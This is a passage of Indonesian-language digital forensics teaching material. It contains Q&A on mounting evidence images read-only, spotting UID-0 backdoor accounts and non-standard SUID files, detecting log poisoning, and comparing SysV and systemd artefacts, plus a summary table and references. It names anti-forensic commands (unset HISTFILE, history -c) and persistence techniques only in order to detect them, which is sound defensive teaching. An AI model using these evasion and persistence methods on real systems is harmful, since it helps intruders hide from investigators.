**Jawaban:** Langkah mounting: (1) **Verifikasi hash** — hitung MD5/SHA256 image sebelum mounting untuk memastikan integritas, (2) **Write-blocking** — selalu mount dalam mode read-only (`mount -o ro` di WSL, atau opsi read-only di FTK Imager), (3) **Mounting via FTK Imager** — buka image file (.dd/.E01), pilih "Image Mounting", set mount type ke "Physical & Logical" dengan write-blocking, (4) **Mounting via WSL2** — gunakan `sudo losetup -fP /mnt/c/evidence/image.dd` kemudian `sudo mount -o ro /dev/loop0p1 /mnt/evidence/`, (5) **Dokumentasi** — catat hash sebelum dan sesudah analisis untuk membuktikan integritas bukti. Pertimbangan penting: jangan pernah mount tanpa write-protection, selalu bekerja pada salinan forensik (bukan bukti asli), dan dokumentasikan setiap langkah untuk chain of custody.

---

## Supplementary Problems

### Problem S1 ⭐
**Soal:** Apa perbedaan antara `/tmp` dan `/var/tmp` dari perspektif forensik?

**Jawaban:** `/tmp` dibersihkan saat reboot (biasanya melalui tmpfiles.d atau mounting sebagai tmpfs), sementara `/var/tmp` mempertahankan data meskipun sistem di-reboot. Dalam konteks forensik, `/var/tmp` lebih mungkin menyimpan artefak yang bertahan lama dari aktivitas mencurigakan, sedangkan `/tmp` hanya relevan jika sistem belum di-reboot sejak insiden terjadi.

---

### Problem S2 ⭐
**Soal:** Bagaimana cara memeriksa apakah terdapat akun dengan UID 0 selain root?

**Jawaban:** Gunakan perintah `awk -F: '$3 == 0 {print}' /etc/passwd`. Perintah ini mem-filter baris di /etc/passwd yang memiliki field ketiga (UID) bernilai 0. Pada sistem normal, hanya entry root yang muncul. Jika ada entry lain, ini mengindikasikan backdoor account dengan hak akses root penuh.

---

### Problem S3 ⭐⭐
**Soal:** Jelaskan konsep SUID bit dan mengapa penting dalam investigasi forensik Linux!

**Jawaban:** SUID (Set User ID) bit memungkinkan file executable berjalan dengan hak akses pemilik file, bukan hak akses user yang menjalankannya. Jika sebuah file dimiliki root dan memiliki SUID bit, maka siapapun yang menjalankannya akan memiliki hak root. Investigator harus mencari file SUID non-standar menggunakan `find / -perm -4000 -type f 2>/dev/null` karena penyerang sering membuat backdoor SUID untuk privilege escalation.

---

### Problem S4 ⭐⭐
**Soal:** Apa yang dimaksud dengan "log poisoning" pada sistem Linux dan bagaimana mendeteksinya?

**Jawaban:** Log poisoning adalah teknik dimana penyerang menyisipkan data berbahaya ke dalam log files, biasanya untuk: (1) Menyesatkan investigator dengan entry palsu, (2) Mengeksploitasi log analysis tools yang memproses log, (3) Melakukan Local File Inclusion (LFI) attack dengan menyisipkan kode PHP di access log. Deteksi dilakukan dengan memeriksa entry log yang mengandung karakter tidak wajar (HTML/PHP tags, encoded strings), membandingkan timestamp log dengan timeline filesystem, dan memverifikasi konsistensi sequential entry.

---

### Problem S5 ⭐⭐⭐
**Soal:** Bandingkan pendekatan forensik antara sistem Linux yang menggunakan SysV init vs systemd dari perspektif artefak yang tersedia!

**Jawaban:** 
- **SysV init**: Log berbasis text (syslog), startup scripts di /etc/init.d/ dan /etc/rc*.d/, service management via `service` command. Artefak: text log files, shell scripts, PID files di /var/run/.
- **Systemd**: Journal binary (journalctl), unit files di /etc/systemd/, socket-based activation, cgroup tracking. Artefak: binary journal (lebih detail tapi memerlukan tools khusus), unit files (deklaratif), timer units, structured logging.
- Systemd menyediakan lebih banyak artefak forensik (cgroup tracking, structured logs, persistent journal) namun memerlukan tools khusus untuk parsing (journalctl, systemd-analyze). SysV init memiliki artefak yang lebih sederhana tapi kurang detail.

---

## Ringkasan

| Konsep | Deskripsi Singkat |
|--------|-------------------|
| **Filesystem Hierarchy Standard** | Struktur direktori Linux standar: /, /etc, /var, /home, /tmp, /root |
| **Inode & Timestamps** | atime (akses), mtime (modifikasi), ctime (metadata), crtime (kreasi - ext4) |
| **/etc/passwd & /etc/shadow** | Data akun pengguna dan hash password; UID 0 selain root = red flag |
| **Bash History** | ~/.bash_history merekam perintah; anti-forensik: unset HISTFILE, history -c |
| **Auth.log** | Log autentikasi: login, sudo, SSH; sumber utama deteksi unauthorized access |
| **Cron & Systemd Timers** | Scheduled tasks; sering dieksploitasi untuk persistence |
| **Log Analysis Tools** | grep, awk, sed untuk text logs; journalctl untuk systemd journal |
| **wtmp/btmp** | Binary log: login sessions (last) dan failed attempts (lastb) |
| **SSH Artifacts** | authorized_keys, known_hosts, sshd_config — target utama penyerang |
| **Hidden Files** | Files/dirs diawali titik (.); tempat umum malware bersembunyi |
| **APFS (macOS)** | Apple filesystem: CoW, snapshots, native encryption |
| **macOS Artifacts** | plist files, Spotlight, FSEvents, Unified Logs |
| **Timeline Analysis** | log2timeline/plaso untuk membuat super timeline dari semua artefak |
| **Living off the Land** | Teknik persistence menggunakan fitur legitimate: cron, systemd, SSH, PAM |

---

## Referensi

1. Casey, E. (2022). *Digital Evidence and Computer Crime: Forensic Science, Computers, and the Internet* (4th Ed.). Academic Press. Chapter 10.
2. Phillips, A., Nelson, B., & Steuart, C. (2022). *Guide to Computer Forensics and Investigations* (6th Ed.). Cengage Learning. Chapter 9.
3. Nikkel, B. (2021). *Practical Forensic Imaging: Securing Digital Evidence with Linux Tools* (2nd Ed.). No Starch Press. Chapter 9-10.
4. Altheide, C. & Carvey, H. (2011). *Digital Forensics with Open Source Tools*. Syngress. Chapter 4-5.
5. Johansen, G. (2020). *Digital Forensics and Incident Response* (2nd Ed.). Packt. Chapter 8.
6. SANS Institute. (2023). *Linux Forensics: Investigator's Guide to Linux Systems*. SANS White Paper.
7. Linux LEO — Law Enforcement and Forensic Examiner's Introduction to Linux. https://linuxleo.com/
8. Digital Corpora Linux Images. https://digitalcorpora.org/corpora/disk-images

---

## License / Lisensi

This repository is licensed under the **Creative Commons Attribution 4.0 International (CC BY 4.0)**.

Commercial use is permitted, provided attribution is given to the author.

© 2026 Anindito
